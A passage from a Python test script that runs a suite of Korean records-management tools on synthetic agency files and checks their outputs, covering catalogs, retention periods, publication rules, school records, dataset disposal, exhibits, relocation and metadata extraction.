          and ld.get("rico:isRelatedTo", [{}])[0].get("@id") == "urn:records:2026-plan" and "싣지 않음" in pubj.get("설명", "")
          and os.path.exists(f"{pk}/bagit.txt") and cv1 == 0 and cv2 == 1 and "바뀜" in ov2 and nev == 6 and crb2 == 3 and crb3 == 2,
          orb1 + ov1 + ov2)

    # 생산 시점 기록화 일괄·목록: 목록 한 행 = 파일 하나, 패키지 전체로 목록·공개데이터·연결 그래프·검색 페이지
    os.makedirs(f"{t}/일괄", exist_ok=True)
    open(f"{t}/일괄/계획.txt", "w", encoding="utf-8").write("가상 계획\n")
    open(f"{t}/일괄/결과.txt", "w", encoding="utf-8").write("가상 결과\n")
    open(f"{t}/일괄/비밀.txt", "w", encoding="utf-8").write("Ⅱ급 비밀\n")
    open(f"{t}/일괄/목록.csv", "w", encoding="utf-8").write("파일,제목,생산일자,식별자,관계,요약,공개구분\n계획.txt,가상 계획,2026-01-10,B-1,,계획 요약,공개\n"
                                                         "결과.txt,가상 결과,2026-03-02,B-2,근거:B-1,결과 요약,비공개\n비밀.txt,가상,2026-03-03,B-3,,,공개\n")
    cbt, obt = run([RBD, "batch", f"{t}/일괄/목록.csv", "--task", "지역축제운영", "--agency", "가상시", "--dept", "기획과", "--period", "10년", "-o", f"{t}/산출/일괄"])
    btr = list(csv.reader(open(f"{t}/산출/일괄/일괄_결과.csv", encoding="utf-8-sig")))[1:] if os.path.exists(f"{t}/산출/일괄/일괄_결과.csv") else []
    cct, oct_ = run([RBD, "catalog", f"{t}/산출/일괄", "--verify", "-o", f"{t}/산출/기록목록"])
    ctl = list(csv.reader(open(f"{t}/산출/기록목록/기록목록.csv", encoding="utf-8-sig")))[1:] if os.path.exists(f"{t}/산출/기록목록/기록목록.csv") else []
    publ = open(f"{t}/산출/기록목록/공개데이터.jsonl", encoding="utf-8").read() if os.path.exists(f"{t}/산출/기록목록/공개데이터.jsonl") else ""
    grh = json.load(open(f"{t}/산출/기록목록/연결그래프.jsonld", encoding="utf-8")) if os.path.exists(f"{t}/산출/기록목록/연결그래프.jsonld") else {}
    cpg = open(f"{t}/산출/기록목록/목록.html", encoding="utf-8").read() if os.path.exists(f"{t}/산출/기록목록/목록.html") else ""
    check("기록화 일괄·목록: 비공개는 사유 없으면 입력 오류·비밀 거부·결과표·목록 고정성 통과·공개데이터는 공개만·연결 그래프·관계 링크",
          cbt == 1 and [r[3] for r in btr] == ["만듦(확인 있음)", "입력 오류", "거부"] and cct == 0 and len(ctl) == 1 and ctl[0][-1] == "통과"
          and "B-1" in publ and "B-2" not in publ and len(grh.get("@graph", [])) == 1 and 'id="B-1"' in cpg, obt + oct_ + str(btr))

    # 업무과정 분석 작업지(KS X ISO TR 26122·TR 21946) → 기록화설정 → sweep(새 파일·개정본) → catalog의 oai_dc·Atom
    open(f"{t}/과제목록.csv", "w", encoding="utf-8").write("대기능,단위과제,보존기간,처리과,단위과제 설명\n일반행정,조례 제정·개정,10년,기획과,조례 입안\n문화,지역축제운영,5년,문화과,축제\n")
    caw, oaw = run([S("records-schedule-check", "scripts", "appraisal_worksheet.py"), f"{t}/과제목록.csv", "--agency", "가상시", "-o", f"{t}/산출/업무분석.xlsx"])
    aww = openpyxl.load_workbook(f"{t}/산출/업무분석.xlsx") if os.path.exists(f"{t}/산출/업무분석.xlsx") else None
    awr = [r for r in aww["기록 요구"].iter_rows(min_row=2, values_only=True)] if aww else []
    acfg = json.load(open(f"{t}/산출/업무분석_기록화설정.json", encoding="utf-8")) if os.path.exists(f"{t}/산출/업무분석_기록화설정.json") else {}
    os.makedirs(f"{t}/업무폴더/지역축제운영", exist_ok=True)
    acfg["기본"]["dept"], acfg["기본"]["period"] = "기획과", "10년"
    json.dump(acfg, open(f"{t}/업무폴더/기록화설정.json", "w", encoding="utf-8"), ensure_ascii=False)
    open(f"{t}/업무폴더/지역축제운영/계획.txt", "w", encoding="utf-8").write("가상 축제 계획\n")
    run([RBD, "sweep", f"{t}/업무폴더", "-o", f"{t}/산출/수집"])
    cs2, os2 = run([RBD, "sweep", f"{t}/업무폴더", "-o", f"{t}/산출/수집"])
    open(f"{t}/업무폴더/지역축제운영/계획.txt", "w", encoding="utf-8").write("가상 축제 계획 수정\n")
    cs3, os3 = run([RBD, "sweep", f"{t}/업무폴더", "-o", f"{t}/산출/수집"])
    run([RBD, "catalog", f"{t}/산출/수집", "-o", f"{t}/산출/수집목록", "--base-url", "https://example.invalid/r"])
    sjl = open(f"{t}/산출/수집목록/목록.html", encoding="utf-8").read() if os.path.exists(f"{t}/산출/수집목록/목록.html") else ""
    run([RBD, "catalog", f"{t}/산출/수집", "-o", f"{t}/산출/수집목록공개", "--public-only"])
    mapok = os.path.exists(f"{t}/산출/수집목록/맥락지도.html") and "지역축제운영" in open(f"{t}/산출/수집목록/맥락지도.mmd", encoding="utf-8").read()
    sjok = mapok and '"@type": "ArchiveComponent"' in sjl and os.path.exists(f"{t}/산출/수집목록/기록목록.csv-metadata.json") and os.path.exists(f"{t}/산출/수집목록/sitemap.xml")
    oai = open(f"{t}/산출/수집목록/oai_dc.xml", encoding="utf-8").read() if os.path.exists(f"{t}/산출/수집목록/oai_dc.xml") else ""
    atom = open(f"{t}/산출/수집목록/feed.atom", encoding="utf-8").read() if os.path.exists(f"{t}/산출/수집목록/feed.atom") else ""
    import xml.dom.minidom as _md
    try:
        _md.parseString(oai.encode()); _md.parseString(atom.encode()); xok = True
    except Exception:
        xok = False
    check("업무과정 분석 작업지·조례 10년 확인 단서·위험 수식 → 기록화설정 → sweep 중복 없음·개정 관계 → oai_dc·Atom 유효·schema.org·CSVW·sitemap",
          caw == 0 and "영구 이상인지 확인" in str(awr[0][6]) and str(aww["위험 평가"]["E2"].value).startswith("=IF(") and acfg["폴더"]["지역축제운영"]["dept"] == "문화과"
          and "새로 기록화 0" in os2 and "새로 기록화 1" in os3 and oai.count("<record>") == 2 and "개정:urn:records:" in oai and xok and atom.count("<entry>") == 2 and sjok,
          oaw + os2 + os3)

    # 2026년도 간행물 발간등록 및 송부지침(2026. 10.): 기관 기호표·발간주기 기호·생략대상 유형·기관·비공개 사유
    xlsx(f"{t}/간행물26.xlsx", [["제목", "발간등록번호", "발행일", "발간형태", "간행물유형", "송부일", "송부부수", "PDF송부", "발행기관", "공개구분", "비공개사유"],
        ["가상 백서", "99-1234567-000001-16", "2026-03-01", "책자", "", "2026-03-05", "3", "Y", "가상부", "공개", ""],
        ["가상 정책 카드뉴스", "", "2026-03-01", "전자", "카드뉴스", "", "", "", "가상부", "공개", ""],
        ["가상 공사 연보", "", "2026-03-01", "책자", "", "", "", "", "가상도시공사", "공개", ""],
        ["가상 내부 보고서", "59-1234567-000002-01", "2026-03-01", "책자", "", "2026-03-05", "3", "Y", "가상시", "비공개", "개인정보"]])
    cpg, opg = run([S("publications-check", "scripts", "pubs_check.py"), f"{t}/간행물26.xlsx", "--year", "2026", "--today", "2026-03-10", "-o", f"{t}/산출/간행물26.xlsx"])
    pg26 = {r[1]: (r[3], r[4], r[6]) for r in openpyxl.load_workbook(f"{t}/산출/간행물26.xlsx")["점검"].iter_rows(min_row=2, values_only=True)} if os.path.exists(f"{t}/산출/간행물26.xlsx") else {}
    check("간행물 2026 송부지침: 기관 기호 99·주기 16 오류, 카드뉴스·공사 생략대상 후보, 59 전남광주 통과, 비공개 호 없음",
          "기호 99" in pg26["가상 백서"][2] and "구분기호 16" in pg26["가상 백서"][2] and pg26["가상 정책 카드뉴스"][1] == "카드뉴스"
          and "공사" in pg26["가상 공사 연보"][1] and "기호" not in pg26["가상 내부 보고서"][2] and "호와 사유" in pg26["가상 내부 보고서"][2], opg + str(pg26))

    # 학교기록물(2025년 학교기록물 관리 지침): 졸업대장·학교폭력 편철·건명 개인정보·동의서 파기·이관 시기·폐교 인계
    open(f"{t}/학교목록.csv", "w", encoding="utf-8").write("건명,생산일자,단위과제,전자구분,이관일자,처분\n2019학년도 제1회 졸업대장,2020-02-04,졸업관리,비전자,,\n"
        "2021학년도 제3회 졸업대장,2021-02-05,졸업관리,비전자,,\n학교폭력 사안 조사 보고,2025-06-01,학생생활지도,전자,,\n학교폭력전담기구 회의록,2025-06-03,학교폭력전담기구구성운영,전자,,\n"
        "진단평가 의뢰서 제출(1-6 손○○),2025-03-02,특수교육,전자,,\n방과후 신청서,2025-03-05,방과후학교,비전자,,개인정보 보유기간 경과 파기\n학교 관인,2024-03-01,관인관리,비전자,,\n")
    csr, osr = run([S("school-records", "scripts", "school_check.py"), f"{t}/학교목록.csv", "--today", "2026-11-21", "--closing", "2027-02-28", "--successor", "가상초", "-o", f"{t}/산출/학교.xlsx"])
    sw_ = openpyxl.load_workbook(f"{t}/산출/학교.xlsx") if os.path.exists(f"{t}/산출/학교.xlsx") else None
    sj = {r[1]: r[4] for r in sw_["점검"].iter_rows(min_row=2, values_only=True)} if sw_ else {}
    st_ = {r[1]: r[5] for r in sw_["이관 시기"].iter_rows(min_row=2, values_only=True)} if sw_ else {}
    sc_ = {r[2]: r[4] for r in sw_["폐교 인계 계획"].iter_rows(min_row=2, values_only=True)} if sw_ else {}
    check("학교기록물: 졸업대장 학년도≠졸업일·학교폭력 단위과제 흩어짐·건명 개인정보·동의서 개인정보 파기 금지·비전자 2년 이관 늦음·공인은 기록관",
          csr == 1 and sj["2019학년도 제1회 졸업대장"] == "통과" and "학년도 2021" in sj["2021학년도 제3회 졸업대장"] and "흩어짐" in sj["(학교폭력 기록물 전체)"]
          and "개인정보(가린 이름)" in sj["진단평가 의뢰서 제출(1-6 손○○)"] and "5.7" in sj["방과후 신청서"] and st_["2019학년도 제1회 졸업대장"] == "이관 늦음"
          and sc_["학교 관인"] == "관할 교육(지원)청 기록관" and sc_["방과후 신청서"] == "가상초", osr + str(sj))

    # 행정정보 데이터세트 평가·폐기 준비(실행매뉴얼 2020 3.3·3.4): 보존기간+처분제약 경과 영역, 영구 제외, SQL은 SELECT만 실행형
    open(f"{t}/단위기능.csv", "w", encoding="utf-8").write("단위기능,테이블,기산일컬럼,보존기간,처분제약,연도별건수\n민원접수,TB_CIVIL,END_DT,5년,0,2018:100;2019:200;2021:300\n"
        "소송자료,TB_SUIT,END_DT,10년,3,2010:50;2012:70\n허가대장,TB_PERMIT,ISSUE_DT,영구,0,\n")
    cdd, odd = run([S("dataset-schedule", "scripts", "dataset_disposal.py"), f"{t}/단위기능.csv", "--system", "가상민원", "--today", "2026-11-21", "-o", f"{t}/산출/데이터세트_평가.xlsx"])
    ddw = openpyxl.load_workbook(f"{t}/산출/데이터세트_평가.xlsx") if os.path.exists(f"{t}/산출/데이터세트_평가.xlsx") else None
    ddl = {r[0]: r for r in ddw["평가 상정 목록"].iter_rows(min_row=2, values_only=True)} if ddw else {}
    dsq = [r[2] for r in ddw["확인용 SQL"].iter_rows(min_row=2, values_only=True)] if ddw else []
    check("데이터세트 평가: 5년 기산 2020 이하 300건·10년+제약3 기산 2012 이하 120건·영구 제외·DELETE는 주석·폐기 기록부",
          cdd == 0 and ddl["민원접수"][4] == 2020 and ddl["민원접수"][5] == 300 and ddl["소송자료"][4] == 2012 and ddl["소송자료"][5] == 120
          and "평가·폐기 대상 아님" in ddl["허가대장"][6] and all(q.startswith(("SELECT", "--")) for q in dsq) and "폐기 결과 기록부" in ddw.sheetnames, odd + str(ddl))

    # 화재 예방 자체 점검표(해외표준 '화재예방 자가 점검 양식' 구성): 빈 점검표 → 아니오 시정 추적·연속 아니오
    FS = S("security-disaster-plan", "scripts", "fire_selfcheck.py")
    run([FS, "--blank", "--areas", "전 층 공통,서고", "-o", f"{t}/산출/화재_빈.xlsx"])
    fwb = openpyxl.load_workbook(f"{t}/산출/화재_빈.xlsx")
    fws = fwb.active
    for r in fws.iter_rows(min_row=2):
        if isinstance(r[0].value, int):
            r[3].value = "예"
    fws["D2"], fws["D3"], fws["F3"] = "아니오", "아니오", "총무과"
    fws["H3"] = "2026-11-01"
    fwb.save(f"{t}/화재_지난.xlsx")
    fws["H3"] = None
    fwb.save(f"{t}/화재_이번.xlsx")
    cfs, ofs = run([FS, "--results", f"{t}/화재_이번.xlsx", "--previous", f"{t}/화재_지난.xlsx", "-o", f"{t}/산출/화재_결과.xlsx"])
    fsm = list(openpyxl.load_workbook(f"{t}/산출/화재_결과.xlsx")["요약"].iter_rows(min_row=2, max_row=2, values_only=True))[0] if os.path.exists(f"{t}/산출/화재_결과.xlsx") else ()
    check("화재 자체 점검: 구역 선택 15항목·아니오 2·시정 미완 2·연속 아니오 2",
          fws.max_row >= 16 and fsm[:4] == (15, 2, 2, 2), ofs + str(fsm))

    # 전시 환경(시행령 별표 6, ANSI/NISO Z39.79): 민감 자료 조도·기간·재전시 간격·자외선·직사광선·펼친 쪽
    open(f"{t}/전시.csv", "w", encoding="utf-8").write("기록물,재질,조도,자외선,시작일,종료일,지난전시종료일,쪽,직사광선,습도설정,온도설정\n"
        "가상 채색 지도,채색 한지,80,60,2026-01-01,2026-06-30,2025-06-01,,,45,20\n가상 인쇄 공보,인쇄,90,50,2026-01-01,2026-03-01,,,,45,20\n"
        "가상 일기철,필사 잉크,40,90,2026-01-01,2026-02-15,,,Y,60,23\n")
    cex, oex = run([S("stack-environment", "scripts", "exhibit_check.py"), f"{t}/전시.csv", "-o", f"{t}/산출/전시.xlsx"])
    exr = {r[0]: r[5] for r in openpyxl.load_workbook(f"{t}/산출/전시.xlsx")["점검"].iter_rows(min_row=2, values_only=True)} if os.path.exists(f"{t}/산출/전시.xlsx") else {}
    check("전시 환경: 채색(매우) 80lux>50·25.9주>12주·재전시 2년 미만, 인쇄(중간) 90lux 통과, 일기철 자외선·직사광선·습도·온도·펼친 쪽",
          cex == 1 and "> 50lux" in exr["가상 채색 지도"] and "> 12주" in exr["가상 채색 지도"] and "재전시" in exr["가상 채색 지도"] and exr["가상 인쇄 공보"] == "통과"
          and all(k in exr["가상 일기철"] for k in ("자외선", "직사광선", "습도", "온도", "펼친 쪽")), oex + str(exr))

    # 근거 자료 변화 감시(오프라인): 기준선 → 새 첨부·게시물·법령 시행일 바뀜 감지
    SW = S("records-qa-gate", "scripts", "source_watch.py")
    os.makedirs(f"{t}/감시", exist_ok=True)
    pg1 = '<div id="contents"><a href="/d?up_filename=가상지침.pdf">가상지침</a><a href="/x?board_seq=101">가상 공지</a><a href="foreignStandardDetail.do?abroad_seq=7&amp;page=1" title="새창으로 열리는 사이트">가상 해외표준</a><a href="foreignStandardDetail.do?abroad_seq=9">900101-1234567</a></div>'
    lw1 = '<div id="contents">[시행 2026. 10. 2.] 제36728호, 2026. 9. 29., 타법개정</div>'
    open(f"{t}/감시/a.html", "w", encoding="utf-8").write(pg1)
    open(f"{t}/감시/l.html", "w", encoding="utf-8").write(lw1)
    json.dump({"출처": [{"이름": "가상 표준", "주소": "https://example.invalid/a", "종류": "목록", "반영": "가상 스킬"},
                       {"이름": "가상 법령", "주소": "https://example.invalid/l", "종류": "법령", "반영": "law-check", "본문비교": False}]},
              open(f"{t}/감시/src.json", "w", encoding="utf-8"), ensure_ascii=False)
    json.dump({"가상 표준": f"{t}/감시/a.html", "가상 법령": f"{t}/감시/l.html"}, open(f"{t}/감시/off.json", "w", encoding="utf-8"), ensure_ascii=False)
    swa = ["--sources", f"{t}/감시/src.json", "--baseline", f"{t}/감시/base.json", "--offline", f"{t}/감시/off.json"]
    csw1, _ = run([SW, *swa, "--update", "--report", f"{t}/감시/r1.md"])
    csw2, _ = run([SW, *swa, "--report", f"{t}/감시/r2.md"])
    open(f"{t}/감시/a.html", "w", encoding="utf-8").write(pg1.replace("</div>", '<a href="/d?up_filename=새지침(2027).pdf">새지침</a><a href="foreignStandardDetail.do?abroad_seq=208">가상 새 해외표준</a></div>'))
    open(f"{t}/감시/l.html", "w", encoding="utf-8").write(lw1.replace("2026. 10. 2.", "2027. 4. 14."))
    csw3, osw3 = run([SW, *swa, "--report", f"{t}/감시/r3.md"])
    rsw = open(f"{t}/감시/r3.md", encoding="utf-8").read() if os.path.exists(f"{t}/감시/r3.md") else ""
    check("근거 변화 감시: 첫 기록·변화 없음 0·새 첨부·새 해외표준(abroad_seq)·주민등록번호 모양 가림·법령 시행일 바뀜 감지(종료 1)·반영할 곳 표시",
          csw1 == 0 and csw2 == 0 and csw3 == 1 and "새지침(2027).pdf" in rsw and "가상 새 해외표준" in rsw
          and "900101-1234567" not in open(f"{t}/감시/base.json", encoding="utf-8").read() and "[시행 2027. 4. 14.]" in rsw and "가상 스킬" in rsw, osw3 + rsw[:400])

    # 생산 시점 기록화 + 법정 보존기간: 메타데이터·연결 그래프·점검에 법적 근거, 평가 작업지 '법규상 요구'
    open(f"{t}/처방묶음.txt", "w", encoding="utf-8").write("가상 처방전 묶음\n")
    crx, orx = run([RBD, "capture", f"{t}/처방묶음.txt", "--task", "처방전 관리", "--agency", "가상병원", "--dept", "약제과", "--person", "김가상",
                    "--role", "기안자", "--title", "가상 처방전", "--period", "1년", "--id", "RX-1", "-o", f"{t}/산출/법정패키지"])
    mrx = json.load(open(f"{t}/산출/법정패키지/RX-1/metadata.json", encoding="utf-8")) if os.path.exists(f"{t}/산출/법정패키지/RX-1/metadata.json") else {}
    grx = json.load(open(f"{t}/산출/법정패키지/RX-1/context.jsonld", encoding="utf-8")) if mrx else {}
    prx = open(f"{t}/산출/법정패키지/RX-1/점검.md", encoding="utf-8").read() if mrx else ""
    erx = open(f"{t}/산출/법정패키지/RX-1/events.jsonl", encoding="utf-8").read() if mrx else ""
    open(f"{t}/평가과제.csv", "w", encoding="utf-8-sig").write("단위과제명,보존기간,업무설명\n직장 내 장애인 인식개선 교육,1년,교육 실시\n회의 운영,3년,\n")
    caw, oaw = run([S("records-schedule-check", "scripts", "appraisal_worksheet.py"), f"{t}/평가과제.csv", "-o", f"{t}/산출/법정작업지.xlsx"])
    awr = {r[0]: (r[2], r[6]) for r in openpyxl.load_workbook(f"{t}/산출/법정작업지.xlsx")["기록 요구"].iter_rows(min_row=2, values_only=True)} if os.path.exists(f"{t}/산출/법정작업지.xlsx") else {}
    check("생산 시점 법정 근거: 처방전 1년 → 의료법 시행규칙 제15조①3호 2년(metadata·RiC-O isOrWasRegulatedBy·사건·점검 '짧음'), 평가 작업지 법규상 요구 채움",
          crx == 1 and mrx.get("보존기간 법적근거", [{}])[0].get("조항") == "제15조①3호" and grx.get("rico:isOrWasRegulatedBy", [{}])[0].get("nak8:법정기간") == "2년"
          and "보존기간 법적근거 확인" in erx and "법정 최소(2년, 처방전)보다 짧음" in prx
          and "장애인복지법" in (awr.get("직장 내 장애인 인식개선 교육", ("",))[0] or "") and "늘려야 함" in (awr["직장 내 장애인 인식개선 교육"][1] or "")
          and not awr.get("회의 운영", ("x",))[0], orx + prx + oaw + str(awr))

    # 법정 보존기간 목록 갱신 감시(오프라인): 최신법령 → 목록에 있는 법령 원문 다시 추출 → 생김·사라짐, --apply, 시행 예정은 알리기만
    import csv as _csv
    _cols = ["출처", "법령", "종류", "시행", "기관", "조문", "의무자", "기록(문구)", "보존기간", "성격", "기산(문구)", "문장", "원문"]
    with open(f"{t}/가상목록.csv", "w", encoding="utf-8-sig", newline="") as _f:
        _w = _csv.DictWriter(_f, fieldnames=_cols)
        _w.writeheader()
        _w.writerow({"출처": "법령", "법령": "가상법 시행규칙", "조문": "제2조(기록의 보존)", "기록(문구)": "점검기록을", "보존기간": "3년", "성격": "최소 보존", "문장": "점검기록을 3년간 보존하여야 한다."})
        _w.writerow({"출처": "법령", "법령": "가상예정법", "조문": "제2조(보존)", "기록(문구)": "대장을", "보존기간": "1년", "성격": "최소 보존", "문장": "대장을 1년간 보존하여야 한다."})
    json.dump({"최신": [{"종류": "법령", "이름": "가상법 시행규칙", "seq": "1", "공포": "2026-11-01", "시행": "2026-11-01", "구분": "개정"},
                        {"종류": "법령", "이름": "가상예정법", "seq": "2", "공포": "2026-11-01", "시행": "2099-01-01", "구분": "개정"},
                        {"종류": "법령", "이름": "관계없는법", "seq": "3", "공포": "2026-11-01", "시행": "2026-11-01", "구분": "개정"}],
               "본문": {"1": "가상법 시행규칙 제1조(목적) 목적. 제2조(기록의 보존) ① 관리자는 점검기록을 5년간 보존하여야 한다.",
                        "2": "가상예정법 제1조(목적) 목적. 제2조(보존) 대장을 3년간 보존하여야 한다."}}, open(f"{t}/최신.json", "w", encoding="utf-8"), ensure_ascii=False)
    csw, osw = run([S("retention-review", "scripts", "statutory_watch.py"), "--catalog", f"{t}/가상목록.csv", "--offline", f"{t}/최신.json",
                    "--report", f"{t}/산출/법정변화.md", "--apply"])
    rsw = open(f"{t}/산출/법정변화.md", encoding="utf-8").read() if os.path.exists(f"{t}/산출/법정변화.md") else ""
    _after = list(_csv.DictReader(open(f"{t}/가상목록.csv", encoding="utf-8-sig")))
    check("법정 보존기간 갱신 감시: 개정 법령 3년→5년 생김·사라짐·--apply로 목록 고침, 시행 예정(2099) 개정은 알리기만, 목록에 없는 법령은 안 읽음",
          csw == 1 and "🆕 제2조(기록의 보존) 5년" in rsw and "➖ 제2조(기록의 보존) 3년" in rsw and "시행 예정" in rsw and "관계없는법" not in rsw
          and {(r["법령"], r["보존기간"]) for r in _after} == {("가상법 시행규칙", "5년"), ("가상예정법", "1년")}, osw + rsw)

    # 같은 판본은 다시 받지 않음(--seen) + 보존 의무 판정기(외부 API 없음)
    _sv = f"{t}/읽은판본.json"
    run([S("retention-review", "scripts", "statutory_watch.py"), "--catalog", f"{t}/가상목록.csv", "--offline", f"{t}/최신.json", "--report", f"{t}/산출/법정변화1.md", "--seen", _sv])
    cs2, os2 = run([S("retention-review", "scripts", "statutory_watch.py"), "--catalog", f"{t}/가상목록.csv", "--offline", f"{t}/최신.json", "--report", f"{t}/산출/법정변화2.md", "--seen", _sv])
    _seen = json.load(open(_sv, encoding="utf-8")) if os.path.exists(_sv) else {}
    check("법정 보존기간 갱신 감시: 이미 읽은 판본(lsiSeq)은 건너뜀, 시행 예정 개정(바뀜 있음)만 다시 알림",
          cs2 == 1 and "같은 판본 건너뜀 1 · 다시 읽음 1 · 바뀐 법령 1(시행 예정 1)" in os2 and _seen.get("법령|가상법 시행규칙|") == "1", os2 + str(_seen))
    cj, oj = run([S("retention-review", "scripts", "retention_judge.py"), "--gold"])
    import re as _re
    _rec = [float(x) for x in _re.findall(r"처음 보는 문장\) \(\d+문장\) p≥0\.3: 정밀 [\d.]+ · 재현 ([\d.]+)", oj)]
    _, oj1 = run([S("retention-review", "scripts", "retention_judge.py"), "② 112치안종합상황실은 24시간 운영체제를 유지해야 한다."])
    _, oj2 = run([S("retention-review", "scripts", "retention_judge.py"), "④ 회의록은 실무협의회 주관위원이 관리하며, 10년간 보존한다."])
    check("보존 의무 판정기: 처음 보는 시험 문장에서 의무 문장을 놓치지 않음(재현 ≥ 0.95), '24시간 운영체제 유지'는 의무 아님 가능성, '회의록 10년간 보존'은 의무",
          cj == 0 and _rec and _rec[0] >= 0.95 and "의무 아님 가능성" in oj1 and oj2.strip().endswith("의무"), oj + oj1 + oj2)

    # 행정박물 관리대상 선별(행정박물 관리지침 2021 표 4)
    _k = ["중요도", "인물", "상징", "예술", "희소", "활용", "보존"]
    xlsx(f"{t}/박물후보.xlsx", [["행정박물명", "생산일자", "생산부서", "유형", "수량", "비고"] + [f"처리과_{k}" for k in _k] + [f"기록관_{k}" for k in _k],
        ["가상 현판", "2020-01-02", "총무과", "상징류", "1", ""] + ["4"] * 14, ["가상 선물 도자기", "2024-05-01", "국제과", "그 밖의 유형", "1", "증정 선물"] + ["2"] * 14,
        ["가상 직인", "2023-01-01", "총무과", "관인류", "1", ""] + ["3"] * 7])
    cas, oas = run([S("admin-artifacts-check", "scripts", "artifact_select.py"), f"{t}/박물후보.xlsx", "-o", f"{t}/산출/박물선별.xlsx"])
    asr = [r for r in openpyxl.load_workbook(f"{t}/산출/박물선별.xlsx")["선별 결과"].iter_rows(min_row=2, values_only=True)] if os.path.exists(f"{t}/산출/박물선별.xlsx") else []
    check("행정박물 선별: 56점 관리대상·28점 비대상·기록관 점수 미완·공직자선물 신고·관인 폐기공고 안내·표 4 체크리스트",
          cas == 0 and [r[9] for r in asr] == ["관리대상", "비대상", "점수 미완"] and asr[0][8] == 56 and "100달러" in str(asr[1][10]) and "폐기공고" in str(asr[2][10]), oas + str(asr))

    # 청사 이전 대비 기록물 이송·재배치(국가기록원 청사 이전 매뉴얼 2014)
    xlsx(f"{t}/보유현황.xlsx", [["부서", "기록물철 제목", "생산연도", "보존기간", "보관위치", "권수", "비밀구분"],
        ["가과", "가상 계획", "2015", "5년", "사무실", "2", ""], ["가과", "가상 대장", "2010", "영구", "문서고", "1", ""],
        ["가과", "가상 통계", "2024", "", "사무실", "1", ""], ["나과", "가상 보고", "2023", "3년", "사무실", "12", ""],
        ["나과", "가상 비밀철", "2020", "30년", "문서고", "1", "Ⅲ급비밀"]])
    crl, orl = run([S("office-relocation", "scripts", "relocation_plan.py"), f"{t}/보유현황.xlsx", "--year", "2026", "--per-box", "10", "-o", f"{t}/산출/청사이전.xlsx"])
    wrl = openpyxl.load_workbook(f"{t}/산출/청사이전.xlsx") if os.path.exists(f"{t}/산출/청사이전.xlsx") else None
    rlf = " ".join(str(c) for sh in wrl.worksheets for r in sh.iter_rows(values_only=True) for c in r if c) if wrl else ""
    dzr = [r for r in wrl["평가·폐기 후보"].iter_rows(min_row=2, values_only=True)] if wrl else []
    bxr = [r for r in wrl["이송 박스"].iter_rows(min_row=2, values_only=True)] if wrl else []
    check("청사 이전: 보존기간 확인·평가폐기 후보(만료)·관리번호(부서→연도→보존기간)·이송 박스·비밀 제외·점검표·박스 라벨 00001·서고 140%·이전비용 수식",
          crl == 0 and len(dzr) == 1 and dzr[0][2] == "가상 계획" and "보존기간 없음" in rlf and "비밀철" not in rlf and "1건 — 목록에서 뺐음" in rlf
          and len({r[0] for r in bxr}) == 4 and "선탑" in rlf and "00001" in rlf and "140%" in rlf and "=ROUND((F" in rlf, orl + str(bxr))

    # 사진 등록대상 선별(국가기록원 시청각기록물 관리지침 2024 3.2)
    try:
        import numpy as _np
        from PIL import Image as _Im
        os.makedirs(f"{t}/사진", exist_ok=True)
        def _sv(nm, arr, tt):
            im = _Im.fromarray(arr.astype("uint8")); ex = _Im.Exif(); ex[306] = tt; ex[36867] = tt
            im.save(f"{t}/사진/{nm}", exif=ex.tobytes())
        _rg = _np.random.default_rng(0)
        _b = _rg.integers(40, 200, (1200, 1800, 3))
        _sv("a1.jpg", _b, "2026:03:02 10:00:00"); _sv("a2.jpg", _np.clip(_b + 3, 0, 255), "2026:03:02 10:00:01")
        _sv("b1.jpg", _rg.integers(0, 30, (1200, 1800, 3)), "2026:03:02 11:00:00")
        _g = _rg.integers(50, 200, (1200, 1800, 1)); _sv("c1.jpg", _np.repeat(_g, 3, axis=2), "2026:03:02 12:00:00")
        _sv("d1.jpg", _rg.integers(40, 200, (600, 800, 3)), "2026:03:02 13:00:00")
        cps, ops = run([S("typed-records-check", "scripts", "photo_select.py"), f"{t}/사진", "-o", f"{t}/산출/사진선별.xlsx"])
        sel = {r[0]: r[8] for r in openpyxl.load_workbook(f"{t}/산출/사진선별.xlsx")["선별"].iter_rows(min_row=2, values_only=True)}
        ok_ps = (cps == 0 and "대표 후보" in str(sel.get("a2.jpg")) and "대표만" in str(sel.get("a1.jpg")) and "노출 부족" in str(sel.get("b1.jpg"))
                 and "흑백" in str(sel.get("c1.jpg")) and "저해상도" in str(sel.get("d1.jpg")))
    except ImportError:
        ok_ps, ops, sel = True, "Pillow 없음 — 건너뜀", {}
    check("사진 등록대상 선별: 연사 대표·노출 부족·흑백 변환·저해상도(시청각기록물 관리지침 2024)", ok_ps, ops + str(sel))

    import zipfile as _zf
    md = f"{t}/메타"
    os.makedirs(md, exist_ok=True)
    with open(f"{md}/공문.txt", "w", encoding="utf-8") as f:
        f.write("가상시\n수신  가상시 기록관장\n제목  2026년 기록물 정리 계획 알림\n\n본문\n\n가상시장\n시행  행정과-1234 (2026. 3. 2.)\n")
    with _zf.ZipFile(f"{md}/보고.hwpx", "w") as z:
        z.writestr("Contents/section0.xml", '<hs:sec xmlns:hp="x"><hp:p><hp:run><hp:t>제목: 가상 사업 결과 보고</hp:t></hp:run></hp:p>'
                   '<hp:p><hp:t>시행 기획과-77 (2025. 12. 30.)</hp:t></hp:p></hs:sec>')
    xlsx(f"{t}/메타목록.xlsx", [["파일명", "제목", "생산일자", "문서번호"],
                                 ["공문.txt", "", "2026-03-02", "행정과-9999"], ["보고.hwpx", "", "", ""]])
    code, out = run([S("metadata-autofill", "scripts", "extract_candidates.py"), md, "--existing", f"{t}/메타목록.xlsx",
                     "-o", f"{t}/산출/meta.xlsx"])
    rows = list(openpyxl.load_workbook(f"{t}/산출/meta.xlsx").active.iter_rows(min_row=2, values_only=True))
    get = lambda fn, el: [r for r in rows if r[0] == fn and r[1] == el]
    ok_md = (get("공문.txt", "제목")[0][2] == "2026년 기록물 정리 계획 알림" and get("공문.txt", "제목")[0][6] == "채울 후보"
             and get("공문.txt", "문서번호")[0][6].startswith("불일치") and get("공문.txt", "생산일자")[0][6] == "일치"
             and get("공문.txt", "생산기관")[0][2] == "가상시장" and get("보고.hwpx", "문서번호")[0][2] == "기획과-77"
             and get("보고.hwpx", "생산일자")[0][2] == "2025-12-30" and all(r[3] for r in rows if r[2]))
    check("메타데이터 후보: 서식 줄 추출·근거 위치·빈칸 채울 후보·불일치 표시(txt·hwpx)", ok_md, out)

    xlsx(f"{t}/청구.xlsx", [["접수번호", "청구인", "청구일", "연장통지일", "결정일", "결정", "비공개사유", "제3자통지일", "공개일", "이의신청일", "이의결정일"],
                           ["F-1", "홍가상", "2026-09-21", "", "2026-10-01", "공개", "", "", "2026-10-08", "", ""],
